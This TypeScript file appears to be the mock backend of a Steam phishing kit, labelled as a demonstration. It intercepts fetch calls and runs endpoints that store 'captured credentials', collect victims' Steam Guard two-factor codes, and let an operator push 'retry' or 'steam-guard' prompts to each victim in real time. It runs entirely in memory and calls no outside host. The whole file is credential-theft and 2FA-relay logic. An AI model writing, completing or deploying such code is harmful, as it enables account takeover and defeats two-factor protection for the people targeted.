
// This file simulates a backend API for the demonstration

// Store for captured credentials
let capturedCredentials: any[] = [];
let adminActions: Record<string, string> = {};
let steamGuardCodes: Record<string, string> = {};

// Mock API response handler
const handleApiRequest = async (url: string, options: RequestInit = {}) => {
  // Simulate network delay
  await new Promise(resolve => setTimeout(resolve, 500));
  
  // Parse the URL to determine the endpoint
  const endpoint = url.split('?')[0];
  
  // Handle different endpoints
  if (endpoint === '/api/store-credentials') {
    console.log("Storing credentials:", options.body);
    try {
      const data = JSON.parse(options.body as string);
      const newCredential = {
        ...data,
        id: Date.now().toString(),
        timestamp: new Date().toISOString(),
        status: 'pending'
      };
      capturedCredentials.push(newCredential);
      console.log("Credentials stored successfully:", newCredential);
      console.log("All credentials:", capturedCredentials);
      return { success: true };
    } catch (error) {
      console.error("Error storing credentials:", error);
      return { success: false, error: "Failed to parse credentials" };
    }
  }
  
  if (endpoint === '/api/store-steamguard') {
    const data = JSON.parse(options.body as string);
    const code = data.code;
    const username = data.username;
    
    console.log("Storing Steam Guard code for user:", username, "code:", code);
    
    // Find the credential with the matching username and update it
    capturedCredentials = capturedCredentials.map(cred => {
      if (cred.username === username) {
        return {
          ...cred,
          steamguard: code,
          status: 'completed'
        };
      }
      return cred;
    });
    
    console.log("Updated credentials after Steam Guard:", capturedCredentials);
    return { success: true };
  }
  
  if (endpoint === '/api/check-admin-action') {
    // Extract username from query params
    const params = new URLSearchParams(url.split('?')[1]);
    const username = params.get('username');
    
    if (username && adminActions[username]) {
      const action = adminActions[username];
      // Clear the action after it's been read
      delete adminActions[username];
      return { action };
    }
    return { action: null };
  }
  
  if (endpoint === '/api/get-credentials') {
    console.log("Returning credentials:", capturedCredentials);
    return capturedCredentials;
  }
  
  if (endpoint === '/api/set-admin-action') {
    const data = JSON.parse(options.body as string);
    adminActions[data.username] = data.action;
    
    // Update status in capturedCredentials
    capturedCredentials = capturedCredentials.map(cred => {
      if (cred.username === data.username) {
        return {
          ...cred,
          status: data.action === 'retry' ? 'rejected' : 
                 data.action === 'steam-guard' ? 'awaiting_2fa' : cred.status
        };
      }
      return cred;
    });
    
    return { success: true };
  }
  
  // Default fallback
  return { error: 'Endpoint not found' };
};

// Intercept fetch calls and route to our mock API
const originalFetch = window.fetch;
window.fetch = async (input: RequestInfo | URL, init?: RequestInit) => {
  const url = typeof input === 'string' ? input : input.toString();
  
  // Only intercept API calls
  if (url.startsWith('/api/')) {
    try {
      console.log(`Intercepted API call to ${url}`);
      const response = await handleApiRequest(url, init);
      console.log(`API response for ${url}:`, response);
      return {
        ok: true,
        status: 200,
        json: async () => response,
        text: async () => JSON.stringify(response)
      } as Response;
    } catch (error) {
      console.error(`Error handling API call to ${url}:`, error);
      return {
        ok: false,
        status: 500,
        json: async () => ({ error: 'Internal error' }),
        text: async () => JSON.stringify({ error: 'Internal error' })
      } as Response;
    }
  }
  
  // For all other requests, use the original fetch
  return originalFetch(input, init);
};

// Initialize the mock API
export const initMockApi = () => {
  console.log('Mock API initialized');
  
  // Initialize with empty data
  capturedCredentials = [];
};

export default {
  initMockApi
};
